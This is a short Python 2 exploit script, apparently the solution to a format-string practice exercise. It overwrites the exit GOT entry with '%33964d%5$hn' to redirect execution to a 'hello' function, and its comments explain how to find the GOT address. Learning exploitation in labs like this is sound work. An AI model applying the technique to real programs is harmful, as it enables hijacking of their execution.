```
import struct
### address of hello 0x080484b4
#exit_plt = struct.pack("I",0x8049724+2) ## address of starting bytes
exit_plt = struct.pack("I",0x8049724) ## address of least sign. bytes
## how to find exit_plt?
## find the call to exit@plt in the disassembly and then disassamble the address
## disassmble 0x80483ec which would disassemble plt instructions.
## Now you will notice jmp instruction which is jumping to got section
## so now just x [address] which would look like x 0x8049724 
## 0x8049724 <_GLOBAL_OFFSET_TABLE_+36>:	0x080483f2

payload = "AAAA"
payload += exit_plt
payload += "%33964d%5$hn"
print payload
